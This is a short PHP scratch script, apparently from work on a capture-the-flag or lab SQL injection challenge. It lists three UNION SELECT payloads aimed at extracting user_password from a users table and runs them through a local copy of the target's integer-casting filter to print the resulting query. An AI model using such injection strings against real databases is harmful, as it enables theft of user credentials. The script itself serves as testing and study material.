<?php
// La query final debe ser:
// SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (...));
// 
// Queremos transformarla en:
// SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (1)) UNION SELECT 0,0,user_password FROM users WHERE user_id=0--;

$payloads = [
    "0,0,1))UNION SELECT 0,0,user_password FROM users WHERE user_id=0--",
    "0,0,1)) UNION SELECT 0,0,user_password FROM users--",
    "0,0,1))UNION SELECT 0,0,user_password FROM users--",
];

foreach ($payloads as $payload) {
    echo "\n" . str_repeat("=", 70) . "\n";
    echo "Payload: $payload\n";
    echo "Length: " . strlen($payload) . " chars\n";
    
    if (strlen($payload) > 70) {
        echo "❌ TOO LONG!\n";
        continue;
    }
    
    $tmp = explode(',', $payload);
    for ($i = 0; $i < count($tmp); $i++) {
        $tmp[$i] = (int)$tmp[$i];
        if($tmp[$i] < 1) {
            unset($tmp[$i]);
        }
    }
    
    $selector = implode(',', array_unique($tmp));
    echo "Selector: $selector\n";
    
    $query = "SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (" . $selector . "));";
    echo "Query: $query\n";
}
?>
